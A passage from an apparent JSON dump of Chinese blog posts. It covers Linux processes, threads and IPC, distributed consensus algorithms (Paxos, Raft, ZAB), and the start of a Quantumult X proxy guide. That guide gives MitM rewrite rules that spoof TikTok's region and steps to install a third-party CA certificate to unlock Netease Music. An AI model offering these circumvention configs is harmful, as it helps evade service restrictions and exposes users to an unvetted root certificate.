寄存器和程序计数器）保存起来，然后加载新任务的上下文到这些寄存器和程序计数器，最后再跳转到程序计数器所指的新位置，运行新任务。\n\n为了控制进程的执行，内核必须有能力挂起正在CPU上运行的进程，并恢复以前挂起的某个进程的执行。这种行为被称为进程切换。因此可以说，任何进程都是在操作系统内核的支持下运行的，是与内核紧密相关的。从一个进程的运行转到另一个进程上运行，这个过程中经过下面这些变化：\n\n1. 保存处理机上下文，包括程序计数器和其他寄存器。\n\n2. 更新PCB信息。\n\n3. 把进程的PCB移入相应的队列，如就绪、在某事件阻塞等队列。\n\n4. 选择另一个进程执行，并更新其PCB。\n\n5. 更新内存管理的数据结构。\n\n6. 恢复处理机上下文。\n\n\n\n<img src=\"linux进程线程原语/13-进程上下文切换.jpg\" alt=\"进程上下文切换\" style=\"zoom:67%;\" />\n\n##### 触发进程切换的时机\n\n- 为了保证所有进程可以得到公平调度，CPU 时间被划分为一段段的时间片，这些时间片再被轮流分配给各个进程\n- 进程在系统资源不足（比如内存不足）时，要等到资源满足后才可以运行，这个时候进程也会被挂起\n- 当进程通过睡眠函数 sleep 这样的方法将自己主动挂起时\n- 当有优先级更高的进程运行时，为了保证高优先级进程的运行，当前进程会被挂起，由高优先级进程来运行\n- 发生硬件中断时，CPU 上的进程会被中断挂起，转而执行内核中的中断服务程序；\n\n##### 进程阻塞\n\n正在执行的进程由于一些事情发生，如请求资源失败、等待某种操作完成、新数据尚未达到或者没有新工作做等，由系统自动执行阻塞原语，使进程状态变为阻塞状态。\n\n因此，进程阻塞是进程自身的一种主动行为，只有处于运行中的进程才可以将自身转化为阻塞状态。当进程被阻塞，它是不占用CPU资源的。\n\n### 1.2 线程\n\n同一个进程内多个线程之间可以共享代码段、数据段、打开的文件等资源，但每个线程各自都有一套独立的寄存器和栈，这样可以确保线程的控制流是相对独立的。\n\n<img src=\"linux进程线程原语/16-多线程内存结构.jpg\" alt=\"多线程\" style=\"zoom:57%;\" />\n\n##### 线程的优点\n\n- 一个进程中可以同时存在多个线程；\n- 各个线程之间可以并发执行；\n- 各个线程之间可以共享地址空间和文件等资源；\n\n##### 线程的缺点\n\n- 当进程中的一个线程崩溃时，会导致其所属进程的所有线程崩溃（这里是针对 C/C++ 语言，Java语言中的线程奔溃不会造成进程崩溃）\n\n##### 线程的上下文切换\n\n这还得看线程是不是属于同一个进程：\n\n+ 当两个线程不是属于同一个进程，则切换的过程就跟进程上下文切换一样；\n\n+ 当两个线程是属于同一个进程，因为虚拟内存是共享的，所以在切换时，虚拟内存这些资源就保持不动，只需要切换线程的私有数据、寄存器等不共享的数据；\n\n所以，线程的上下文切换相比进程，开销要小很多。\n\n### 1.3 线程进程区别\n\n> 进程是资源分配的最小单位，线程是CPU调度的最小单位；\n\n\n\n- 进程是资源（包括内存、打开的文件等）分配的单位，线程是 CPU 调度的单位；\n- 进程拥有一个完整的资源平台，而线程只独享必不可少的资源，如寄存器和栈；\n- 线程同样具有就绪、阻塞、执行三种基本状态，同样具有状态之间的转换关系；\n- 线程能减少并发执行的时间和空间开销；\n\n\n\n# 2. 进程间通信\n\n<img src=\"linux进程线程原语/4-进程空间.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n每个进程的用户地址空间都是独立的，一般而言是不能互相访问的，但内核空间是每个进程都共享的，所以进程之间要通信必须通过内核。\n\n进程间通信主要包括管道、系统IPC（包括消息队列、信号量、信号、共享内存等）、以及套接字socket。\n\n### 2.1 管道\n\n```c\nint pipe(int fd[2])\n```\n\n\n\n这里表示创建一个匿名管道，并返回了两个描述符，一个是管道的读取端描述符 `fd[0]`，另一个是管道的写入端描述符 `fd[1]`。注意，这个匿名管道是特殊的文件，只存在于内存，不存于文件系统中。\n\n<img src=\"linux进程线程原语/5-管道-pipe.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n这两个描述符都是在一个进程里面，并没有起到进程间通信的作用，怎么样才能使得管道是跨过两个进程的呢？\n\n我们可以使用 `fork` 创建子进程，**创建的子进程会复制父进程的文件描述符**，这样就做到了两个进程各有两个「 `fd[0]` 与 `fd[1]`」，两个进程就可以通过各自的 fd 写入和读取同一个管道文件实现跨进程通信了。\n\n<img src=\"linux进程线程原语/6-管道-pipe-fork.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n- 父进程关闭读取的 fd[0]，只保留写入的 fd[1]；\n- 子进程关闭写入的 fd[1]，只保留读取的 fd[0]；\n\n\n\n<img src=\"linux进程线程原语/7-管道-pipe-fork-单向通信.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n所以说如果需要双向通信，则应该创建两个管道。\n\n\n\n在 shell 里面执行 `A | B`命令的时候，A 进程和 B 进程都是 shell 创建出来的子进程，A 和 B 之间不存在父子关系，它俩的父进程都是 shell。\n\n<img src=\"linux进程线程原语/8-管道-pipe-shell.jpg\" alt=\"img\" style=\"zoom:40%;\" />\n\n\n\n不管是匿名管道还是命名管道，进程写入的数据都是缓存在内核中，另一个进程读取数据时候自然也是从内核中获取。\n\n### 2.2  消息队列\n\nA 进程要给 B 进程发送消息，A 进程把数据放在对应的消息队列后就可以正常返回了，B 进程需要的时候再去读取数据就可以了。同理，B 进程要给 A 进程发送消息也是如此。\n\n消息队列是保存在内核中的消息链表。消息队列不适合比较大数据的传输，因为在内核中每个消息体都有一个最大长度的限制，同时所有队列所包含的全部消息体的总长度也是有上限。\n\n消息队列通信过程中，存在用户态与内核态之间的数据拷贝开销，因为进程写入数据到内核中的消息队列时，会发生从用户态拷贝数据到内核态的过程，同理另一进程读取内核中的消息数据时，会发生从内核态拷贝数据到用户态的过程。\n\n### 2.3 共享内存\n\n共享内存的机制，就是拿出一块虚拟地址空间来，映射到相同的物理内存中。这样这个进程写入的东西，另外一个进程马上就能看到了，都不需要拷贝来拷贝去，传来传去，大大提高了进程间通信的速度。\n\n<img src=\"linux进程线程原语/9-共享内存.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n### 2.4 信号量\n\n信号量其实是一个整型的计数器，主要用于实现进程间的互斥与同步，而不是用于缓存进程间通信的数据。信号初始化为 1，就代表着是互斥信号量，它可以保证共享内存在任何时刻只有一个进程在访问，这就很好的保护了共享内存。\n\n例如，进程 A 是负责生产数据，而进程 B 是负责读取数据，这两个进程是相互合作、相互依赖的，进程 A 必须先生产了数据，进程 B 才能读取到数据，所以执行是有前后顺序的。\n\n那么这时候，就可以用信号量来实现多进程同步的方式，我们可以初始化信号量为 `0`。\n\n<img src=\"linux进程线程原语/11-信号量-同步.jpg\" alt=\"img\" style=\"zoom:80%;\" />\n\n### 2.5  信号\n\n上面说的进程间通信，都是常规状态下的工作模式。对于异常情况下的工作模式，就需要用「信号」的方式来通知进程。\n\n信号跟信号量虽然名字相似度 66.66%，但两者用途完全不一样，就好像 Java 和 JavaScript 的区别。\n\n信号是进程间通信机制中唯一的异步通信机制，因为可以在任何时候发送信号给某一进程，一旦有信号产生，我们就有下面这几种，用户进程对信号的处理方式。\n\n+ 1.执行默认操作。Linux 对每种信号都规定了默认操作，例如，上面列表中的 SIGTERM 信号，就是终止进程的意思。\n+ 2.捕捉信号。我们可以为信号定义一个信号处理函数。当信号发生时，我们就执行相应的信号处理函数。\n+ 3.忽略信号。当我们不希望处理某些信号的时候，就可以忽略该信号，不做任何处理。有两个信号是应用进程无法捕捉和忽略的，即 SIGKILL 和 SEGSTOP，它们用于在任何时候中断或结束某一进程。\n\n### 2.6 Socket\n\n要想跨网络与不同主机上的进程之间通信，就需要 Socket 通信了。\n\n+ 针对 TCP 协议通信的 socket 编程模型\n\n<img src=\"linux进程线程原语/12-TCP编程模型.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n+ 针对 UDP 协议通信的 socket 编程模型\n\n<img src=\"linux进程线程原语/13-UDP编程模型.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n# 2. 孤儿和僵尸进程\n\n 当一个进程完成它的工作终止之后，它的父进程需要调用wait()或者waitpid()系统调用取得子进程的终止状态。\n\n### 2.1 孤儿进程\n\n一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。\n\n孤儿进程是没有父进程的进程，孤儿进程这个重任就落到了init进程身上，init进程就好像是一个民政局，专门负责处理孤儿进程的善后工作。孤儿进程并不会有什么危害。\n\n### 2.2 僵尸进程\n\n一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵死进程。\n\n任何一个子进程(init除外)在exit()之后，并非马上就消失掉，而是留下一个称为僵尸进程(Zombie)的数据结构，等待父进程处理。如果子进程在exit()之后，父进程没有来得及处理，这时用ps命令就能看到子进程的状态是“Z”。如果父进程能及时处理，可能用ps命令就来不及看到子进程的僵尸状态，但这并不等于子进程不经过僵尸状态。\n\n##### 1. 原因\n\n例如有个进程，它定期的产生一个子进程，这个子进程需要做的事情很少，做完它该做的事情之后就退出了，因此这个子进程的生命周期很短，但是，父进程只管生成新的子进程，至于子进程 退出之后的事情，则一概不闻不问，这样，系统运行上一段时间之后，系统中就会存在很多的僵死进程，倘若用ps命令查看的话，就会看到很多状态为Z的进程。 \n\n严格地来说，僵死进程并不是问题的根源，罪魁祸首是产生出大量僵死进程的那个父进程。\n\n##### 2. 解决\n\n+ 进程通过 wait 和 waitpid 等函数等待子进程结束\n\n  但这会导致父进程挂起，所以这并不是一个好办法，父进程如果不能和子进程并发执行的话，那我们创建子进程的意义就没有。同时一个 wait 只能解决一个子进程，如果有多个子进程就要用到多个 wait\n\n  \n\n+ 通过信号机制\n\n  子进程退出时，向父进程发送 SIGCHILD 信号，父进程处理 SIGCHILD 信号，在信号处理函数中调用 wait 进行处理僵尸进程。\n\n  \n\n+ fork两次\n\n  原理是将进程成为孤儿进程，从而其的父进程变为 init 进程，通过 init 进程处理僵尸进程。具体操作为：父进程一次 fork() 后产生一个子进程随后立即执行 wait(NULL) 来等待子进程结束，然后子进程 fork() 后产生孙子进程随后立即exit(0)。这样子进程顺利终止（父进程仅仅给子进程收尸，并不需要子进程的返回值），然后父进程继续执行。这时的孙子进程由于失去了它的父进程（即是父进程的子进程），将被转交给Init进程托管。于是父进程与孙子进程无继承关系了，它们的父进程均为Init，Init进程在其子进程结束时会自动收尸，这样也就不会产生僵死进程了。\n\n  \n\n+ kill 父进程\n\n  严格地来说，僵死进程并不是问题的根源，罪魁祸首是产生出大量僵死进程的那个父进程。因此，当我们寻求如何消灭系统中大量的僵死进程时，答案就是把产生大量僵死进程的那个元凶枪毙掉（也就是通过 kill 发送 SIGTERM 或者 SIGKILL 信号啦）。枪毙了元凶进程之后，它产生的僵死进程就变成了孤儿进 程，这些孤儿进程会被 init 进程接管，init 进程会 wait() 这些孤儿进程，释放它们占用的系统进程表中的资源，这样，这些已经僵死的孤儿进程就能瞑目而去了。\n\n\n\n# 4. 头脑风暴\n\n- 运行可执行程序后，会产生进程。进程有 PCB（描述符，状态，CPU 寄存器，程序计数器），用来上下文切换。\n- 线程在进程里，共享代码段，数据段，打开的文件。有独立的寄存器和栈，切换效率高。\n- 进程通信，管道（fork 原理），内核消息队列，共享内存，信号，Socket。\n- 产生僵尸进程原因没 wait，解决：wait，子进程给父进程发信号，连续 fork 两次变孤儿，kill 父进程。\n\n# 5. 参考资料\n\n+ https://www.xiaolincoding.com/os/4_process/process_base.html\n","tags":["linux"],"categories":["系统"]},{"title":"分布式协议和算法","url":"%2Fp%2Fe9812233.html","content":"\n# 1. 分布式算法\n\n### 1.1 分布式算法的四大维度\n\n四大维度：拜占庭容错、一致性、性能、可用性。\n\n<img src=\"分布式协议和算法/640.png\" alt=\"img\" style=\"zoom:75%;\" />\n\n<!-- more -->\n\n+ 拜占庭容错\n\n  拜占庭容错就是《拜占庭将军问题》中提出的一个模型，该模型描述了一个完全不可信的场景。不可信体现在：\n\n  - 故障行为。比如节点故障了。\n  - 恶意行为。比如恶意节点冒充正常节点，发出错误指令。\n\n+ 一致性\n\n  一致性分为三种：\n\n  - 强一致性：保证写操作完成后，任何后续访问都能读到更新后的值。\n  - 弱一致性：写操作完成后，系统不能保证后续的访问都能读到更新后的值。\n  - 最终一致性：保证如果对某个对象没有新的写操作，最终所有后续访问都能读到相同的最近更新的值。\n\n  在数据库操作层面，我们多使用二阶段提交协议（2PC）保证强一致性。在分布式系统中，多使用 **Raft 算法来保证强一致性**。\n\n  如果考虑可用性，则使用 Gossip 协议实现最终一致性，配合 Quorum NWR 算法的三个参数来调节容错能力。**而 zookeeper 基于读性能的考虑，通过 ZAB 协议提供最终一致性。**\n\n+ 性能\n\n  可用性最强的就是 Gossip 协议了，即时只有一个节点，集群可以提供服务。\n\n  然后是 Paxos/Raft/ZAB/Quorum NWR/FBFT/POW 算法，能够容忍部分节点故障。\n\n  而 2PC、TCC 要求所有节点都正常运行，系统才能正常工作，可用性最低。\n\n+ 可用性\n\n  上面可用性的排序同样适用于性能维度。Gossip 协议可用于 AP 型分布式系统，水平扩展能力强，读写性能最强。\n\n  Paxos/Raft/ZAB/Quorum NWR/FBFT/POW 算法都是领导者模型，写性能依赖领导者，读性能依赖一致性的实现。性能处于中等位置。\n\n  而 2PC、TCC 实现事务时，需要预留和锁定资源，性能较差。\n\n\n\n# 2. 拜占庭问题\n\n<img src=\"分布式协议和算法/640-20230904190503340.png\" alt=\"图片\" style=\"zoom:75%;\" />\n\n- 刘备决定进攻，通过信使告诉曹操和孙坚进攻。\n- 曹操决定撤退，通过信使告诉刘备和孙坚撤退。\n- 孙坚作为内奸使诈，通过信使告诉刘备进攻，告诉曹操撤退。\n\n刘备的票数为进攻 2 票，撤退 1 票，曹操的票数为进攻 1 票，撤退 2 票。按照少数服从多数的原则，刘备最后会选择进攻，而曹操会选择撤退，孙坚作为内奸肯定不会进攻，刘备单独进攻反贼董卓，势单力薄，被董卓干掉了。\n\n### 2.1 拜占庭问题解法\n\n如果叛将人数为 m，将军数 n >= 3m + 1，那么就可以解决拜占庭将军问题。\n\n前提条件：叛将数 m 已知，需要进行 m + 1 轮的作战协商。\n\n比如上述的攻打董卓问题，曹操、刘备、孙坚三个人当中，孙坚是叛将，他可以使诈，使作战计划不统一。必须增加一位忠臣袁绍来协商共识，才能达成一致性作战计划。\n\n可不要小瞧拜占庭问题，它可是分布式场景最复杂的的故障场景。比如在数字货币的区块链技术中就有用到这些知识点。而且必须使用拜占庭容错算法（也就是 Byzantine Fault Tolerance，BFT）。\n\n拜占庭容错算法还有 FBFT 算法，PoW 算法。\n\n有了拜占庭容错算法，肯定有非拜占庭容错算法，顾名思义，就是没有发送误导信息的节点。CFT 算法就是解决分布式系统中存在故障，但不存在恶意节点的场景下的共识问题。简单来说就是可能因系统故障造成丢失消息或消息重复，但不存在错误消息、伪造消息。对应的算法有 Paxos 算法、Raft 算法、ZAB 协议。\n\n**这么多算法该如何选择？**\n\n节点可信，选非拜占庭容错算法。否则就用拜占庭容错算法，如区块链中用到的 PoW 算法。\n\n\n\n# 3. Paxos 算法\n\n`Paxos` 是分布式算法中的老大哥，可以说 Paxos 是分布式共识的代名词。最常用的分布式共识算法都是基于它改进。比如 Raft 算法。所以学习分布式算法必须先学习 Paxos 算法。\n\nPaxos 算法主要包含两个部分：\n\n- **Basic Paxos 算法**：多个节点之间如何就某个值达成共识。（这个值我们称作`提案 Value`）\n- **Multi-Paxos 算法**：执行多个 Basic Paxos 实例，就一系列值达成共识。\n\nBasic Paxos 算法是 Multi-Paxos 思想的核心，Multi 的意思就是多次，也就是说多执行几次 Basic Paxos 算法。所以 Basic Paxos 算法是重中之重。\n\n### 3.1 角色\n\nPaxos 中有三种角色：提议者（Proposer）、接受者（Acceptor）、学习者（Learner）。\n\n\n\n<img src=\"分布式协议和算法/640-20230904193905334.png\" alt=\"图片\" style=\"zoom:75%;\" />\n\n##### 1. 提议者（Proposer）\n\n- 提议一个值，用于投票表决。\n- 接入和协调，收到客户端的请求后，可以发起二阶段提交，进行共识协商。\n- `映射`到上面的故事中，`军师`就是用来部署作战计划的。\n\n##### 2. 接受者（Acceptor）\n\n- 对每个提议的值进行投票，并存储接受的值。\n- 投票协商和存储数据，对提议的值进行投票，并接受达成共识的值，存储保存。\n- `映射`到上面的故事中，`武将`就是用来接受军师的作战计划。\n- 其实，集群中所有的节点都在扮演接受者的角色，参与共识协商，并接受和存储数据。\n\n##### 3. 学习者（Learner）\n\n- 被告知投票的结果，接受达成共识的值，存储数据，\n- 不参与投票的过程，即不参与共识协商。\n- `映射`到上面的故事中，就是两名`文臣`作为记录作战方案的`备胎`。\n\n\n\n### 3.2 接受者？提议者？\n\n有的节点即可以扮演接受者，也可以扮演提议者。\n\n- **作为接受者**，接收客户端的消息。比如`诸葛亮`需要接收`刘备`的作战要求。\n- **作为提议者**，发起二阶段提交。然后这个节点和另外其他节点作为接受者进行共识协商。比如`诸葛亮`要汇总最终的作战计划给`刘备`。\n\n如下图所示，节点 1 作为提议者和接受者，节点 2 和节点 3 作为接受者。\n\n<img src=\"分布式协议和算法/640-20230904194233820.png\" alt=\"图片\" style=\"zoom:75%;\" />\n\n### 3.3 流程\n\n诸葛亮的作战计划是从北边进攻曹操，庞统的作战计划是从南边进攻曹操，而关羽、张飞、赵云先后收到了他们的作战计划，该听谁的呢？这里就是一个共识的问题。\n\n**而 Paxos 算法达成共识分两个阶段。准备（Prepare）阶段和接受（Accept）阶段。**\n\n##### 1. 准备阶段\n\n<img src=\"分布式协议和算法/640-20230904194855309.png\" alt=\"图片\" style=\"zoom:75%;\" />\n\n而对于庞统的准备请求，关羽、张飞收到编号为 `2` 的准备请求，而 编号 `2` 大于之前接受到的编号 `1` ，而且关羽和张飞没有通过任何提案，所以还是会返回给庞统一个`尚无提案` 的响应。\n\n而赵云最后收到诸葛亮编号为 `1` 的`准备请求`后，因编号 `1`小于之前响应的准备请求的提案编号 `2`，所以直接丢弃该准备请求，不做响应，如上图的 ❌ 图示。\n\n##### 2. 接受阶段\n\n**发送接受请求**\n\n<img src=\"分布式协议和算法/640-20230904195124325.png\" alt=\"图片\" style=\"zoom:75%;\" />\n\n`诸葛亮`收到大多数接受者（关羽和张飞）的`准备响应`后，根据响应中提案编号最大的提案的值，设置`接受请求`中的值\n\n而`庞统`收到大多数接受者（关羽、张飞和赵云）的`准备响应`后，根据响应中提案编号最大的提案的值，设置`接受请求`中的值。\n\n**收到接受请求**\n\n<img src=\"分布式协议和算法/640-20230904195141432.png\" alt=\"图片\" style=\"zoom:75%;\" />\n\n关羽、张飞、赵云收到诸葛亮发送的提案 [1，北]时候，因为提案编号 `1`小于他们承诺的能通过的提案的最小提案编号 `2`，所以诸葛亮的提案被拒绝了。\n\n而当他们收到庞统的发送的提案 [2，南] 的时候，因为编号 2 不小于之前承诺的编号 2，所以通过庞统的提案 [2，南] ，所以关羽、张飞、赵云他们的作战计划是从南边进攻曹操。达成了共识。\n\n##### 3. 学习者登场\n\n当接受者通过了一个提案时，就通知所有的学习者。当学习者发现大多数的接受者都通过了某个提案，那么学习者也会通过该提案，接受该提案的值。\n\n也就是说关羽、张飞、赵云达成了共识后，学习者`法正`和`马良`也同样通过从南边进攻的作战计划。\n\n### 3.4 提案编号\n\n提案编号代表优先级，保证了三个承诺：\n\n- - 如果`准备请求`的提案编号，`小于等于`接受者已经响应的`准备请求`的提案编号，那么接受者将承诺不响应这个`准备请求`。\n  - 如果`接受请求`中的提案的提案编号，`小于`接受者已经响应的`准备请求`的提案，那么接受者将承诺不通过这个提案。\n  - 如果接受者之前有通过提案，那么接受者将承诺，会在`准备请求`的响应中，包含已经通过的最大编号的提案信息。\n\n\n\n<img src=\"分布式协议和算法/4.png\" alt=\"1\" style=\"zoom:67%;\" />\n\n\n\n<img src=\"分布式协议和算法/5.png\" alt=\"1\" style=\"zoom:67%;\" />\n\n# 4. Raft 算法\n\nRaft 算法是分布式系统开发首选的共识算法。比如现在流行 Etcd、Consul。Raft 算法是通过一切以领导者为准的方式，实现一系列值的共识和各节点日志的一致。\n\n动画演示：http://thesecretlivesofdata.com/raft/\n\n### 4.1 角色\n\n##### 1. **跟随者（Follower）**\n\n`普通群众`，默默接收和来自领导者的消息，当领导者心跳信息超时的时候，就主动站出来，推荐自己当候选人。\n\n##### 2. **候选人（Candidate）**\n\n`候选人`将向其他节点请求投票 RPC 消息，通知其他节点来投票，如果赢得了大多数投票选票，就晋升当领导者。\n\n##### 3. **领导者（Leader）**\n\n`霸道总裁`，一切以我为准。处理写请求、管理日志复制和不断地发送心跳信息，通知其他节点“我是领导者，我还活着，你们不要”发起新的选举，不用找新领导来替代我。\n\n### 4.2 选举过程\n\n初始状态下，集群中所有节点都是跟随者的状态。\n\n##### 1. 默认都是跟随者\n\n如下图所示，有三个节点(Node) a、b、c，任期（Term）都为 0。\n\n<img src=\"分布式协议和算法/640-20230904200514379.png\" alt=\"图片\" style=\"zoom:50%;\" />\n\n##### 2. 随机超时成为候选人\n\nRaft 算法实现了随机超时时间的特性，每个节点等待领导者节点心跳信息的超时时间间隔是随机的。比如 A 节点等待超时的时间间隔 150 ms，B 节点 200 ms，C 节点 300 ms。那么 a 先超时，最先因为没有等到领导者的心跳信息，发生超时。如下图所示，三个节点的超时计时器开始运行。\n\n<img src=\"分布式协议和算法/640.gif\" alt=\"图片\" style=\"zoom:67%;\" />\n\n当 A 节点的超时时间到了后，A 节点成为候选者，并增加自己的任期编号，Term 值从 0 更新为 1，并给自己投了一票。\n\n- Node A：Term = 1, Vote Count = 1。\n- Node B：Term = 0。\n- Node C：Term = 0。\n\n<img src=\"分布式协议和算法/640-20230904200702277.gif\" alt=\"图片\" style=\"zoom:67%;\" />\n\n##### 3.  候选者让其他人投票\n\n在一次选举中，每一个服务器节点最多会对一个任期编号投出一张选票，投完了就没了。\n\n<img src=\"分布式协议和算法/640-20230904200717833.gif\" alt=\"图片\" style=\"zoom:67%;\" />\n\n- **第一步**：节点 A 成为候选者后，向其他节点发送请求投票 RPC 信息，请它们选举自己为领导者。\n- **第二步**：节点 B 和 节点 C 接收到节点 A 发送的请求投票信息后，在编号为 1 的这届任期内，还没有进行过投票，就把选票投给节点 A，并增加自己的任期编号。\n- **第三步**：节点 A 收到 3 次投票，得到了大多数节点的投票，从候选者成为本届任期内的新的领导者。\n- **第四步**：节点 A 作为领导者，固定的时间间隔给 节点 B 和节点 C 发送心跳信息，告诉节点 B 和 C，我是领导者，组织其他跟随者发起新的选举。\n- **第五步**：节点 B 和节点 C 发送响应信息给节点 A，告诉节点 A 我是正常的。\n\n\n\n### 4.3 任期\n\n英文单词是 term，领导者是有任期的。\n\n- **自动增加**：跟随者在等待领导者心跳信息超时后，推荐自己为候选人，会增加自己的任期号，如上图所示，节点 A 任期为 0，推举自己为候选人时，任期编号增加为 1。\n- **更新为较大值**：当节点发现自己的任期编号比其他节点小时，会更新到较大的编号值。比如节点 A 的任期为 1，请求投票，投票消息中包含了节点 A 的任期编号，且编号为 1，节点 B 收到消息后，会将自己的任期编号更新为 1。\n- **恢复为跟随者**：如果一个候选人或者领导者，发现自己的任期编号比其他节点小，那么它会立即恢复成跟随者状态。这种场景出现在分区错误恢复后，任期为 3 的领导者受到任期编号为 4 的心跳消息，那么前者将立即恢复成跟随者状态。\n- **拒绝消息**：如果一个节点接收到较小的任期编号值的请求，那么它会直接拒绝这个请求，比如任期编号为 6 的节点 A，收到任期编号为 5 的节点 B 的请求投票 RPC 消息，那么节点 A 会拒绝这个消息。\n\n### 4.4 大多数\n\n假设一个集群由 N 个节点组成，那么大多数就是至少 N/2+1。例如：3 个节点的集群，大多数就是 2。\n\n### 4.5 领导者故障\n\n如果领导者节点出现故障，则会触发新的一轮选举。如下图所示，领导者节点 A 发生故障，节点 B 和 节点 C 就会重新选举 Leader。\n\n<img src=\"分布式协议和算法/640-20230904201234538.gif\" alt=\"图片\" style=\"zoom:67%;\" />\n\n- **第一步** ：节点 A 发生故障，节点 B 和节点 C 没有收到领导者节点 A 的心跳信息，等待超时。\n- **第二步**：节点 C 先发生超时，节点 C 成为候选人。\n- **第三步**：节点 C 向节点 A 和节点 B 发起请求投票信息。\n- **第四步**：节点 C 响应投票，将票投给了 C，而节点 A 因为发生故障了，无法响应 C 的投票请求。\n- **第五步**：节点 C 收到两票（大多数票数），成为领导者。\n- **第六步**：节点 C 向节点 A 和 B 发送心跳信息，节点 B 响应心跳信息，节点 A 不响应心跳信息。\n\n\n\n# 5. ZAB 算法\n\nZAB 协议的全称是 Zookeeper Atomic Broadcase，原子广播协议。\n\n### 5.1 角色\n\n##### 1. Observer\n\n和 Follower 一样，唯一不同的是，不参与 Leader 的选举，且状态为 OBSERING。\n\n##### 2. Follower\n\n负责处理客户端发送的读请求，转发写事务请求给 Leader。参与 Leader 的选举，状态为 FOLLOWING。\n\n##### 3. Leader\n\n负责处理客户端发送的读、写事务请求。这里的事务请求可以理解这个请求具有事务的 ACID 特性。\n同步写事务请求给其他节点，且需要保证事务的顺序性。状态为 LEADING。\n\n### 5.2 选举\n\n<img src=\"分布式协议和算法/image-20220323174738548VLeZat.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n- 节点 A 先`投票给自己`，投票信息包含`节点 id（SID)` 和一个 `ZXID`，如 （1,0）。SID 是配置好的，且唯一，ZXID 是唯一的递增编号。\n- 节点 B 先`投票给自己`，投票信息为（2,0）。\n- 然后节点 A 和 B 将自己的投票信息`投票`给集群中`所有节点`。\n- 节点 A 收到节点 B 的投票信息后，`检查`下节点 B 的状态是否是`本轮投票`，以及是否是`正在选举(LOOKING)`的状态。\n- 投票 PK：节点 A 会将自己的投票和别人的投票进行 PK，如果别的节点发过来的 ZXID 较大，则把自己的投票信息`更新`为别的节点发过来的投票信息，**如果 ZXID 相等，则比较 SID**。这里节点 A 和 节点 B 的 ZXID 相同，SID 的话，节点 B 要大些，所以节点 A 更新投票信息为（2，0），然后将投票信息`再次`发送出去。而节点 B `不需要更新`投票信息，但是下一轮还需要再次将投票发出去。\n\n### 5.3 领导者故障\n\n- 剩下的 Follower 进行选举，Observer 不参与选举。\n- 投票信息中的 zxid 用的是本地磁盘日志文件中的。如果这个节点上的 zxid 较大，就会被当选为 Leader。如果 Follower 的 zxid 都相同，则 Follower 的节点 id 较大的会被选为 Leader。\n\n\n\n### 5.4 节点之间同步数据\n\n而客户端发送读写请求时是不知道自己连的是Leader 还是 Follower。\n\n**如果客户端连的是主节点**，发送了写请求，那么 Leader 执行 2PC（两阶段提交协议）同步给其他 Follower 和 Observer 就可以了。\n\n**如果客户端连的是 Follower**，发送了写请求，那么 Follower 会将写请求转发给 Leader，然后 Leader 再进行 2PC 同步数据给 Follower。\n\n\n\n# 6. 参考资料 \n\n+ https://toutiao.io/posts/ax7f2dz/preview\n+ https://pdai.tech/md/algorithm/alg-domain-distribute-overview.html\n+ https://www.bilibili.com/video/BV1TW411M7Fx\n+ http://thesecretlivesofdata.com/raft/\n+ https://raft.github.io/\n","tags":["分布式"],"categories":["分布式"]},{"title":"QuantumultX神器的使用","url":"%2Fp%2F6f2c88a8.html","content":"\nQuantumult X 是目前 iOS 平台主流的全能网络工具，提供 MitM、HTTP Debug 乃至 JS 脚本等诸多功能，同时保持了相当高的易用性。 \n\n这是一个付费软件，需要在 App Store 进行购买才能使用。\n\n<!-- more -->\n\n# 1. 配置\n\n### 1.1  预配置\n\nhttps://github.com/Orz-3/QuantumultX\n\n先下载预配置后，再导入自己的节点。\n\n### 1.2 icon 库\n\nhttps://github.com/Koolson/Qure\n\n建议直接导入json。\n\n### 1.3 订阅转换\n\n魅影极速机场官方订阅转换。\n\nhttps://api.nameless13.com/\n\n早期是Dler Cloud 机场官方的订阅转换网站，后来独立出来了。现在应该是和 Dler 无关。\n\nhttps://sub.dler.io/\n\n更加强大的转换\n\nhttps://sub.v1.mk/\n\n\n\n### 1.4 自动检测指定机场策略\n\n```ini\n[policy]\nurl-latency-benchmark=不值钱节点, resource-tag-regex=^(?!.*Amy), check-interval=300, tolerance=0, alive-checking=false, img-url=https://raw.githubusercontent.com/Koolson/Qure/master/IconSet/Color/Media.png\n```\n\n\n\n# 2. 功能\n\n### 2.1 网易云\n\n注意Quanx并不能直接解锁网易云，还是需要搭建代理转发服务器的。参见：https://www.liuvv.com/p/3a9129d9.html\n\na. 下载证书\n\nhttps://raw.githubusercontent.com/UnblockNeteaseMusic/server/enhanced/ca.crt\n\nb. 配置， http处是自己的服务器地址\n\n```ini\n[server_local]\nhttp=152.136.138.232:8080, fast-open=false, udp-relay=false, tag=🎧 解锁网易云音乐\n\n\n[policy]\nstatic=解锁网易云音乐, direct, proxy, 🎧 解锁网易云音乐, img-url=https://raw.githubusercontent.com/Koolson/Qure/master/IconSet/Color/Netease_Music_Unlock.png\n\n[filter_remote]\nhttps://raw.githubusercontent.com/GeQ1an/Rules/master/QuantumultX/Filter/Optional/Netease%20Music.list, tag=解锁网易云音乐, force-policy=解锁网易云音乐, update-interval=172800, opt-parser=false, enabled=true\n```\n\n\n\n### 2.2 Tiktok\n\na. 注意  TikTok Version 21.1.0 ，最好不要升级\n\nb. 配置\n\n```ini\n[rewrite_local]\n(?<=_region=)CN(?=&) url 307 KR\n(?<=&mcc_mnc=)4 url 307 2\n^(https?:\\/\\/(tnc|dm)[\\w-]+\\.\\w+\\.com\\/.+)(\\?)(.+) url 302  $1$3\n(?<=\\d\\/\\?\\w{7}_\\w{4}=)1[6-9]..(?=.?.?&) url 307 17\n\n[mitm]\nhostname = *.tiktokv.com, *.byteoversea.com, *.tik-tokapi.com\n\n[filter_remote]\nhttps://raw.githubusercontent.com/Semporia/TikTok-Unlock/master/Quantumult-X/TikTok.list, tag=TikTok, force-policy=TikTok, update-interval=86400, 